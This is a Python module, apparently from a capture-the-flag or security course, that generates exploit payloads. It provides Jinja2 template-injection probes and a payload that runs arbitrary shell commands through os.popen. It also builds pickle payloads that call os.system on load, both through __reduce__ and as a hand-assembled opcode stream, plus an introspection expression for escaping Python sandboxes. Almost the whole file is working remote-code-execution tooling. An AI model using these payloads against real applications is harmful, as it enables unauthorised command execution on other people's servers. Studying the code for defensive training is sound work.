"""Web helpers: SSTI probing and pickle-based code execution.

Two classic server-side bug classes share this module because they share a
root cause -- trusting attacker-controlled data as *code*:

* **SSTI** (ch09): user input reaches ``render_template_string`` and Jinja2
  evaluates it. :func:`ssti_probes` and :func:`ssti_rce_payload` build the
  escalation chain from ``{{7*7}}`` to RCE.
* **Pickle** (ch08/ch09): ``pickle.loads`` on attacker data is arbitrary code
  execution. :func:`pickle_rce` uses ``__reduce__``; :func:`pickle_opcode_rce`
  hand-builds the opcode stream for jails that inspect opcodes.

These are for understanding and exploiting *your own* local, retired targets.
"""
from __future__ import annotations

import pickle

__all__ = [
    "ssti_probes",
    "ssti_rce_payload",
    "pickle_rce",
    "pickle_opcode_rce",
    "object_chain_payload",
]


def ssti_probes() -> list[str]:
    """Return template payloads that confirm (and fingerprint) SSTI.

    Send each and watch the response. ``{{7*7}}`` -> ``49`` proves the input
    is evaluated as a template rather than echoed literally; the ``${}`` /
    ``#{}`` forms help tell Jinja2/Twig/etc. apart.
    """
    return ["{{7*7}}", "${7*7}", "#{7*7}", "{{7*'7'}}", "{% raw %}x{% endraw %}"]


def ssti_rce_payload(command: str, var: str = "x") -> str:
    """Build a Jinja2 SSTI payload that runs ``command`` and prints its output.

    Uses the ``request``/``cycler`` globals walk that works on a default Flask
    app: reach ``os.popen`` through ``__globals__`` and read the result.
    """
    # The {{ ... }} is evaluated server-side; .read() returns the output.
    return (
        "{{ cycler.__init__.__globals__.os.popen(%r).read() }}" % command
    )


class _Reduce:
    """Pickle calls ``__reduce__`` on load; we return a callable + its args."""

    def __init__(self, func, args):
        self._func = func
        self._args = args

    def __reduce__(self):
        return (self._func, self._args)


def pickle_rce(command: str) -> bytes:
    """Build a pickle that runs ``command`` via ``os.system`` on load.

    The ``__reduce__`` protocol tells ``pickle.loads`` to call
    ``os.system(command)`` -- the textbook "never unpickle untrusted data"
    demonstration.
    """
    import os

    return pickle.dumps(_Reduce(os.system, (command,)))


def pickle_opcode_rce(module: str, func: str, arg: str) -> bytes:
    """Hand-assemble a pickle opcode stream calling ``module.func(arg)``.

    For jails that whitelist opcodes or globals, you build the stream by hand
    from primitives:

    * ``c`` GLOBAL  -> push ``module func`` (newline separated)
    * ``(`` MARK, push ``arg`` as a short string, ``t`` TUPLE
    * ``R`` REDUCE  -> call the global with the tuple
    * ``.`` STOP

    Returns raw pickle bytes you can feed to a permissive unpickler.
    """
    arg_bytes = arg.encode()
    if len(arg_bytes) >= 256:
        raise ValueError("arg too long for SHORT_BINUNICODE demo path")
    payload = b"c" + module.encode() + b"\n" + func.encode() + b"\n"
    payload += b"("  # MARK
    # SHORT_BINUNICODE (0x8c): one length byte + utf-8 bytes
    payload += b"\x8c" + bytes([len(arg_bytes)]) + arg_bytes
    payload += b"t"  # TUPLE
    payload += b"R"  # REDUCE
    payload += b"."  # STOP
    return payload


def object_chain_payload(index_hint: str = "subprocess") -> str:
    """Return the canonical object-introspection escape expression.

    Walks ``().__class__.__bases__[0].__subclasses__()`` to reach a class in
    the loaded set (filter by ``index_hint``) whose ``__init__.__globals__``
    exposes dangerous modules. This is the pyjail/SSTI backbone (ch08).
    """
    return (
        "[c for c in ().__class__.__bases__[0].__subclasses__() "
        f"if {index_hint!r} in c.__name__.lower()]"
    )
